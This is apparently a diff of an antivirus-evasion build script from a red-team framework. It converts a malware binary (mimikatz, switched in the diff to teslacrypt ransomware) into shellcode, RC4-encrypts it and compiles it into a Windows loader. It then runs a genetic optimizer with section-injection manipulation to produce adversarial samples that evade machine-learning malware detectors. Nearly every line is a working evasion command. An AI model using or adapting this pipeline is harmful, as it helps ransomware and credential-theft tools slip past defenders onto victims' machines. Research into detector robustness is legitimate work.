@@ -37,7 +37,7 @@ generate_key preset aabbccdd1122 input/key_raw.txt
 
 # convert mimikatz executable into shellcode format
 # Can be of course used with other .exe files
-wine ./../pe_to_shellcode/pe2shc.exe input/mimikatz.exe input/sc_raw.txt
+wine ./../pe_to_shellcode/pe2shc.exe input/teslacrypt.exe input/sc_raw.txt
 # encrypt payload
 encode_payload rc4 input/sc_raw.txt input/sc_enc_raw.txt input/key_raw.txt
 
@@ -66,9 +66,13 @@ $win64_compiler -o output/rc4enc_mimikatz_adversarial_win64.exe source/avet.c
 strip output/rc4enc_mimikatz_adversarial_win64.exe
 
 # generate adversarial example
-gen_adversarial_exe full_dos output/rc4enc_mimikatz_adversarial_win64.exe
-sleep 2
+practical_manipulation="section_injection"
+population_size=100
 
+$genetic_optimizer -pm $practical_manipulation -p $population_size output/rc4enc_mimikatz_adversarial_win64.exe
+
+# Or use practical manipulation without optimizer
+# gen_adversarial_exe section_injection output/rc4enc_mimikatz_adversarial_win64.exe
 
 # cleanup
 cleanup_techniques
